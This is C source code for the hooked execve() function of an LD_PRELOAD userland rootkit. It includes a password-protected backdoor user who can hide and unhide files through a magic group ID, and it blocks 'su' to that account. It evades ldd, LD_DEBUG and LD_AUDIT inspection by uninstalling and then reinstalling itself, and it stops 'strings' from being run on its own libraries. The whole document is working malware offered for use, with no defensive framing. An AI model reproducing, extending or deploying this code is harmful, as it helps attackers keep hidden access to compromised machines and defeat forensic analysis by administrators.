int execve(const char *filename, char *const argv[], char *const envp[])
{
    HOOK(o_execve, CEXECVE);
    HOOK(o_unlink,CUNLINK);
    HOOK(o_chown,CCHOWN);
    HOOK(o_xstat,C__XSTAT);
    if(is_bdusr())
    {
        /* hide&unhide files. 'etc/eutils.sh' makes using this easier. */
        char *eutils=strdup(EUTILS); xor(eutils);
        if(strstr(filename,eutils) && argv[1] != NULL)
        {
            CLEAN(eutils);
            char *bdpwd=strdup(BD_PWD); xor(bdpwd);
            /* verify that we have the correct password */
            if(strcmp(crypt(argv[1], bdpwd), bdpwd)) { CLEAN(bdpwd); exit(-1); }
            CLEAN(bdpwd);

            if(argv[2] == NULL) exit(-1); /* now we need an option - what does the user want to do? */

            if(argv[3] != NULL) /* if we have argv[3], it should be a path, verify it exists */
            {
                struct stat vstat;
                memset(&vstat,0,sizeof(stat));
                if(o_xstat(_STAT_VER,argv[3],&vstat) < 0) exit(-1); /* exit with -1 if we can't stat the path */
            }

            if(!strcmp(argv[2],"hide_path")) (void) o_chown(argv[3],MGID,MGID);
            else if(!strcmp(argv[2], "unhide_path")) (void) o_chown(argv[3],0,0); /* just chown the file to root perms so it's visible */
            exit(0);
        }
        CLEAN(eutils);

        return o_execve(filename,argv,envp);
    }
    if(geteuid() == 0) reinstall();

    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(strstr(filename,"su") && argv[1] && !strcmp(argv[1], bduname)) { CLEAN(bduname); errno=EIO; return -1; }
    CLEAN(bduname);

    if(hxstat(filename,MGID,32)) { errno=ENOENT; return -1; }

    int i, pid, ret;
    for(i=0;i<HPROCS_SIZE;i++)
    { /* uninstall&reinstall self if the user is running something nasty */
        char *cproc=strdup(hprocs[i]); xor(cproc);
        int checkcproc=hbdvl(filename, cproc, ret);
        CLEAN(cproc);

        switch(checkcproc)
        {
            case 1:
              exit(0);
              break;
            case 0:
              errno=EIO;
              return -1;
              break;
            case -1:
              return -1;
              break;
            case 2:
              return o_execve(filename, argv, envp);
              break;
            default:
              continue;
        }
    }
    
    char *ldsp = strdup(LDSO_PRELOAD); xor(ldsp);
    if(!fnmatch("*/*ld-linux*.so.*", filename, FNM_PATHNAME) || !fnmatch("*/*ld-*.so", filename, FNM_PATHNAME))
    {
        for(i=0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "--list"))
            {
                if(getuid() != 0 && geteuid() != 0) { CLEAN(ldsp); errno = EIO; return -1; }

                o_unlink(ldsp);

                if((pid = fork()) == -1) return -1;
                else if(pid == 0) return o_execve(filename, argv, envp);

                wait(&ret);
                reinstall();
                if(!hxstat(ldsp,MGID,32)) o_chown(ldsp,MGID,MGID);
                CLEAN(ldsp);
                exit(0);
            }
        }
    }
    for(i=0; envp[i] != NULL; i++)
    {
        if(strstr(envp[i], "LD_TRACE_LOADED_OBJECTS=") || strstr(envp[i], "LD_DEBUG=") || strstr(envp[i], "LD_AUDIT=") || getenv("LD_AUDIT"))
        {
            if(getuid() != 0 && geteuid() != 0) { CLEAN(ldsp); errno = EIO; return -1; }

            o_unlink(ldsp);

            if((pid = fork()) == -1) return -1;
            else if(pid == 0) return o_execve(filename, argv, envp);
            wait(&ret);
            reinstall();
            if(!hxstat(ldsp,MGID,32)) o_chown(ldsp,MGID,MGID);
            CLEAN(ldsp);
            exit(0);
        }
    }
    CLEAN(ldsp);

    /* block users from pointing LD_PRELOAD to original libc library */
    for(i=0; envp[i] != NULL; i++)
        if(getenv("LD_PRELOAD") && strstr(envp[i], "libc.so.6")) { errno = EPERM; return -1; }

    /* block users from calling 'strings' on either rootkit or dynamic linker libraries */
    if(argv[0] != NULL && strstr(argv[0], "strings"))
    {
        char *bdvlso = strdup(BDVLSO); xor(bdvlso);
        for(i=0; argv[i] != NULL;i++)
        {
            if(strstr(argv[i], bdvlso) || strstr(argv[i], "ld-") || strstr(argv[i], "utmp"))
            {
                CLEAN(bdvlso);
                errno = EPERM; return -1;
            }
        }
        CLEAN(bdvlso);
    }

    return o_execve(filename,argv,envp);
}
